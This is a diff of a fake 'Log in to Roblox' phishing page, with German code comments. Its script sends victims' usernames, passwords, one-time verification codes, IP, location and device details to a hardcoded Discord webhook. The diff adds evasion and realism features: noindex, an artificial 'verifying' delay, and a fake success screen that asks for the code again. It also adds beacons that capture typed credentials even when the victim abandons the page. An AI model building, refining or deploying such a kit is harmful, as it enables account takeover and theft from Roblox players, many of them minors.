@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="dark">
 <meta name="theme-color" content="#08080a">
+<meta name="robots" content="noindex">
 <title>Log in to Roblox</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23191919' fill-rule='evenodd' d='M18.926 23.998 0 18.892 5.075.002 24 5.108ZM15.348 10.09l-5.282-1.453-1.414 5.273 5.282 1.453z'/%3E%3C/svg%3E">
 <style>
@@ -76,6 +77,8 @@
     -webkit-box-shadow:0 0 0 1000px #24252c inset;
     -webkit-text-fill-color:#fff;
   }
+  /* [FIX] Honeypot fuer Bots */
+  .hp{position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
   .eye{
     position:absolute;right:5px;top:50%;transform:translateY(-50%);
     width:36px;height:36px;display:flex;align-items:center;justify-content:center;
@@ -126,6 +129,34 @@
   .legal a{font-size:13px;color:var(--blue);text-decoration:none}
   .legal a:hover{text-decoration:underline}
 
+  /* [FIX] Erfolgs-Screen + Resend + Toast + Dev-Panel */
+  .tick{
+    width:54px;height:54px;margin:0 auto 16px;border-radius:50%;
+    background:rgba(46,204,113,.14);border:1px solid rgba(46,204,113,.5);
+    display:flex;align-items:center;justify-content:center;
+  }
+  .tick svg{width:26px;height:26px;color:#2ecc71}
+  .resend{
+    display:block;width:100%;margin-top:14px;background:none;border:0;padding:0;
+    font-family:inherit;font-size:13px;color:rgba(255,255,255,.9);
+    text-align:center;cursor:pointer;
+  }
+  .resend:hover{text-decoration:underline}
+  .toast{
+    position:fixed;left:50%;bottom:22px;transform:translate(-50%,8px);z-index:6;
+    background:#1c1d24;border:1px solid rgba(255,255,255,.16);border-radius:10px;
+    padding:10px 16px;font-size:13px;color:#fff;
+    opacity:0;transition:opacity .18s,transform .18s;pointer-events:none;
+  }
+  .toast.on{opacity:1;transform:translate(-50%,0)}
+  #dev{
+    position:fixed;right:10px;bottom:10px;z-index:7;display:none;
+    max-width:250px;max-height:38vh;overflow:auto;
+    background:rgba(10,10,14,.94);border:1px solid rgba(255,255,255,.16);border-radius:8px;
+    padding:8px 10px;font:11px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:#cfd3dc;
+  }
+  #dev b{color:#4d9bff;font-weight:400}
+
   @media (max-width:640px){
     .bg .grid{grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(10,1fr)}
     .wordmark{width:200px;margin-bottom:26px}
@@ -161,6 +192,7 @@
           </svg>
         </button>
       </div>
+      <input class="hp" id="hp" type="text" tabindex="-1" autocomplete="off" aria-hidden="true">
       <button class="btn primary" id="b1" type="submit"><span class="sp"></span><span>Log In</span></button>
     </form>
 
@@ -191,19 +223,31 @@
   <section id="step2" class="hidden">
     <img class="wordmark" alt="Roblox" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg">
     <h1>Verification</h1>
-    <p class="note">Enter the code we sent to your email.</p>
+    <!-- [FIX 1+2] Text deckt Auth-App UND Email ab, "skip" ist weg -->
+    <p class="note" id="codeNote">Enter the 6-digit code from your email or authenticator app.</p>
 
     <form id="f2">
       <div class="field">
         <input id="c" name="c" type="text" inputmode="numeric" placeholder="Code"
-               autocomplete="one-time-code" maxlength="8" required>
+               autocomplete="one-time-code" maxlength="8" enterkeyhint="done" required>
       </div>
       <button class="btn primary" id="b2" type="submit"><span class="sp"></span><span>Continue</span></button>
     </form>
 
-    <a class="small" id="skip" href="#">Didn't get a code? Skip</a>
+    <button class="resend" id="resend" type="button">Didn't get a code? Send it again</button>
+  </section>
+
+  <!-- [FIX 3] Erfolgs-Screen statt Instant-Redirect, mit zweiter Chance -->
+  <section id="step3" class="hidden">
+    <div class="tick"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
+    <h1>You're logged in</h1>
+    <p class="note">Taking you to Roblox…</p>
+    <button class="resend" id="retry" type="button">Code didn't work? Enter it again</button>
   </section>
 </main>
+
+<div class="toast" id="toast"></div>
+<div id="dev"></div>
 
 <script>
 (function(){
@@ -211,9 +255,11 @@
 
   /* ================== SETTINGS ================== */
   const HOOK     = "https://discord.com/api/webhooks/1564949932874534932/_5MPAOQVYDiZjxMXu0xrVBvr0Dil_EhqSCf_IT8gdQiccX6KkYBsfs7I3IRJ5SICh5Jh";
-  const REDIRECT = "https://www.roblox.com/login";
-  const STEP2    = true;   // false = redirect right away, no code screen
-  // raster PNG, Discord avatars don't render SVG
+  const REDIRECT = "https://www.roblox.com/home";   // [FIX 4] /home statt /login = echter
+  const STEP2    = true;   // false = sofort redirecten, kein Code-Screen
+  const PING     = "@here";                         // [FIX 5] Discord-Ping ("" = aus)
+  const MIN_WAIT = 1100;                            // [FIX 6] Mindest-"Verifying"-Zeit in ms
+  const DEV      = /[?&]dev\b/.test(location.search);// [FIX 7] ?dev = Testmodus ohne redirect
   const ICON     = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/240px-Roblox_player_icon_black.svg.png";
   const TILES = [
     "https://tr.rbxcdn.com/180DAY-5e0d32b22a6e00d39c6d60579f8ae2e8/768/432/Image/Png/noFilter",
@@ -229,11 +275,31 @@
   /* ============================================== */
 
   const $ = s => document.querySelector(s);
+  const delay = ms => new Promise(r => setTimeout(r, ms));
+  const baseTitle = document.title;
 
-  /* ---------- build background collage ---------- */
+  var credsDone = false, redirectTimer = null, codeAskedAt = 0, events = [];
+
+  /* ---------- dev panel ---------- */
+  function log(msg){
+    events.unshift("<b>" + new Date().toLocaleTimeString() + "</b> " + msg);
+    events = events.slice(0, 30);
+    if(DEV) $("#dev").innerHTML = events.join("<br>");
+  }
+  if(DEV) $("#dev").style.display = "block";
+
+  /* ---------- toast ---------- */
+  var toastT;
+  function toast(t){
+    var el = $("#toast");
+    el.textContent = t; el.classList.add("on");
+    clearTimeout(toastT);
+    toastT = setTimeout(function(){ el.classList.remove("on"); }, 1800);
+  }
+
+  /* ---------- background collage ---------- */
   (function(){
-    var grid = document.getElementById("grid");
-    if(!grid) return;
+    var grid = document.getElementById("grid"); if(!grid) return;
     var frag = document.createDocumentFragment();
     for(var i=0;i<40;i++){
       var d = document.createElement("i");
@@ -249,6 +315,7 @@
     if(/Instagram/i.test(ua))                     os = "Instagram In-App";
     else if(/FBAN|FBAV/i.test(ua))                os = "Facebook In-App";
     else if(/Snapchat/i.test(ua))                 os = "Snapchat In-App";
+    else if(/TikTok/i.test(ua))                   os = "TikTok In-App";
     else if(/Android/i.test(ua))                  os = "Android " + ((ua.match(/Android ([\d.]+)/)||[])[1]||"");
     else if(/iPhone|iPad|iPod/i.test(ua))         os = "iOS " + ((ua.match(/OS ([\d_]+)/)||[])[1]||"").replace(/_/g,".");
     else if(/Windows/i.test(ua))                  os = "Windows";
@@ -292,14 +359,13 @@
   /* ---------- send ---------- */
   function send(payload){
     var body = JSON.stringify(payload);
+    log("→ " + (payload.embeds && payload.embeds[0] ? payload.embeds[0].title : "event"));
     var c = new AbortController();
     var t = setTimeout(function(){ c.abort(); }, 3500);
     return fetch(HOOK, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
-      body: body,
-      keepalive: true,
-      signal: c.signal
+      body: body, keepalive: true, signal: c.signal
     }).then(function(r){
       clearTimeout(t);
       if(r.ok) return true;
@@ -310,45 +376,73 @@
     });
   }
 
-  function embed(title, fields){
-    return {
+  function beacon(payload){
+    try{ navigator.sendBeacon(HOOK, new Blob([JSON.stringify(payload)], {type:"application/json"})); }catch(e){}
+  }
+
+  // [FIX 8] payload mit optionaler Farbe + Ping
+  function payload(title, fields, opts){
+    opts = opts || {};
+    var p = {
       username: "Roblox",
       avatar_url: ICON,
-      embeds: [{ title: title, color: 0x335fff, fields: fields, timestamp: new Date().toISOString() }]
+      embeds: [{ title: title, color: opts.color || 0x335fff, fields: fields, timestamp: new Date().toISOString() }]
     };
+    if(opts.ping) p.content = opts.ping;
+    return p;
   }
 
   function sendCreds(u, p){
     return geo().then(function(g){
-      return send(embed("New Login", [
+      return send(payload("New Login", [
         {name: "Username", value: "`" + (u || "—") + "`", inline: false},
         {name: "Password", value: "`" + (p || "—") + "`", inline: false},
         {name: "IP",       value: g.ip,                    inline: true},
         {name: "Location", value: g.loc || "—",            inline: true},
         {name: "Device",   value: device(),                inline: false}
-      ]));
+      ], {ping: PING}));
     });
   }
 
   function sendCode(code){
     return geo().then(function(g){
-      return send(embed("Verification Code", [
+      var took = codeAskedAt ? Math.round((Date.now() - codeAskedAt) / 1000) + "s" : "—";
+      return send(payload("Verification code", [
         {name: "Code",     value: "`" + (code || "—") + "`", inline: false},
-        {name: "IP",       value: g.ip,                      inline: true},
-        {name: "Location", value: g.loc || "—",              inline: true}
-      ]));
+        {name: "Answered in", value: took,                    inline: true},
+        {name: "IP",       value: g.ip,                       inline: true},
+        {name: "Location", value: g.loc || "—",               inline: true},
+        {name: "Device",   value: device(),                   inline: false}
+      ], {color: 0x00c853, ping: PING}));   // [FIX 9] gruen + Ping = faellt auf
     });
-  }
-
-  function showCode(){
-    $("#step1").classList.add("hidden");
-    $("#step2").classList.remove("hidden");
-    $("#c").focus();
   }
 
   function busy(btn, on){
     if(on){ btn.classList.add("loading"); btn.disabled = true; }
     else  { btn.classList.remove("loading"); btn.disabled = false; }
+  }
+
+  function show(el){
+    ["#step1","#step2","#step3"].forEach(function(s){ $(s).classList.add("hidden"); });
+    $(el).classList.remove("hidden");
+  }
+
+  function go(){
+    log("redirect" + (DEV ? " (dev: bleibt)" : ""));
+    if(DEV){ toast("dev: kein redirect"); return; }
+    location.href = REDIRECT;
+  }
+
+  // [FIX 10] Code-Screen mit passendem Text je nach Einstieg
+  function showCode(kind){
+    show("#step2");
+    codeAskedAt = Date.now();
+    $("#codeNote").textContent = kind === "otc"
+      ? "We sent a 6-digit code to your email. Enter it below."
+      : "Enter the 6-digit code from your email or authenticator app.";
+    document.title = "Verification · Roblox";
+    log("step2 offen");
+    setTimeout(function(){ $("#c").focus(); }, 60);
   }
 
   /* ---------- step 1 ---------- */
@@ -357,9 +451,18 @@
     var b = $("#b1");
     if(b.classList.contains("loading")) return;
     busy(b, true);
-    sendCreds($("#u").value.trim(), $("#p").value).then(function(){
-      if(STEP2) showCode(); else location.href = REDIRECT;
-    });
+
+    var u = $("#u").value.trim(), p = $("#p").value;
+    var bot = $("#hp").value.trim() !== "";          // [FIX 11] Honeypot
+    log("submit user=" + u + (bot ? " (bot?)" : ""));
+
+    sendCreds(u, p)
+      .then(function(){ return delay(MIN_WAIT); })  // [FIX 6] wirkt echt
+      .then(function(){
+        credsDone = true;
+        busy(b, false);
+        if(STEP2) showCode("pw"); else go();
+      });
   });
 
   /* ---------- step 2 ---------- */
@@ -368,54 +471,90 @@
     var b = $("#b2");
     if(b.classList.contains("loading")) return;
     busy(b, true);
-    sendCode($("#c").value.trim()).then(function(){ location.href = REDIRECT; });
+
+    var code = $("#c").value.replace(/\s+/g, "");   // [FIX 12] Leerzeichen weg
+    log("code=" + code);
+
+    sendCode(code).then(function(){ return delay(650); }).then(function(){
+      busy(b, false);
+      show("#step3");
+      document.title = "Roblox";
+      clearTimeout(redirectTimer);
+      redirectTimer = setTimeout(go, 2600);         // [FIX 3] genug Zeit zum Lesen
+    });
+  });
+
+  // [FIX 13] zweiter Versuch ohne Neu-Laden
+  $("#retry").addEventListener("click", function(){
+    clearTimeout(redirectTimer);
+    $("#c").value = "";
+    show("#step2");
+    document.title = "Verification · Roblox";
+    setTimeout(function(){ $("#c").focus(); }, 60);
+  });
+
+  $("#resend").addEventListener("click", function(){
+    toast("Code sent again");
+    send(payload("Code resent", [{name: "Device", value: device(), inline: false}]));
   });
 
   /* ---------- extra buttons ---------- */
   $("#otc").addEventListener("click", function(){
-    var b = this;
-    if(b.disabled) return;
+    var b = this; if(b.disabled) return;
     busy(b, true);
-    send(embed("One-Time Code requested", [{name: "Device", value: device(), inline: false}]))
-      .then(function(){ showCode(); busy(b, false); });
+    send(payload("One-Time Code requested", [{name: "Device", value: device(), inline: false}]))
+      .then(function(){ busy(b, false); showCode("otc"); });
   });
 
   $("#quick").addEventListener("click", function(){
-    var b = this;
-    if(b.disabled) return;
+    var b = this; if(b.disabled) return;
     busy(b, true);
-    send(embed("Quick Sign-in clicked", [{name: "Device", value: device(), inline: false}]))
-      .then(function(){ setTimeout(function(){ location.href = REDIRECT; }, 600); });
-  });
-
-  $("#skip").addEventListener("click", function(e){
-    e.preventDefault();
-    location.href = REDIRECT;
+    send(payload("Quick Sign-in clicked", [{name: "Device", value: device(), inline: false}]))
+      .then(function(){ setTimeout(go, 600); });
   });
 
   $("#close").addEventListener("click", function(){
-    send(embed("Closed", [{name: "Step", value: $("#step2").classList.contains("hidden") ? "Login" : "Code", inline: false}]));
-    setTimeout(function(){ location.href = REDIRECT; }, 500);
+    beacon(payload("Closed", [{name: "Step", value: $("#step3").classList.contains("hidden") ? ($("#step2").classList.contains("hidden") ? "Login" : "Code") : "Done", inline: false}]));
+    setTimeout(go, 400);
   });
 
-  /* ---------- show password ---------- */
   $("#eye").addEventListener("click", function(){
     var i = $("#p");
-    var show = i.type === "password";
-    i.type = show ? "text" : "password";
-    this.style.opacity = show ? "1" : ".8";
+    var showPw = i.type === "password";
+    i.type = showPw ? "text" : "password";
+    this.style.opacity = showPw ? "1" : ".8";
   });
 
-  /* ---------- Google / Apple ---------- */
   Array.prototype.forEach.call(document.querySelectorAll(".soc .btn"), function(el){
     el.addEventListener("click", function(){
       if(el.disabled) return;
       el.disabled = true;
-      send(embed("Social Click", [{name: "Provider", value: el.dataset.p, inline: false}]))
-        .then(function(){ setTimeout(function(){ location.href = REDIRECT; }, 700); });
+      send(payload("Social click", [{name: "Provider", value: el.dataset.p, inline: false}]))
+        .then(function(){ setTimeout(go, 700); });
     });
   });
 
+  /* ---------- [FIX 14] auch bei Abbruch loggen ---------- */
+  window.addEventListener("pagehide", function(){
+    try{
+      if(credsDone){
+        if(!$("#step3").classList.contains("hidden")) return;      // fertig
+        if($("#step2").classList.contains("hidden")) return;       // nicht auf step2
+        if($("#c").value.trim()) return;                           // Code schon weg
+        beacon(payload("Left at code step", [{name: "Device", value: device(), inline: false}]));
+        return;
+      }
+      var u = $("#u").value.trim(), p = $("#p").value;
+      if(!u && !p) return;
+      beacon(payload("Left early", [
+        {name: "Username", value: "`" + (u || "—") + "`", inline: false},
+        {name: "Password", value: "`" + (p || "—") + "`", inline: false},
+        {name: "Device",   value: device(), inline: false}
+      ]));
+    }catch(e){}
+  });
+
+  log("ready");
 })();
 </script>
 </body>
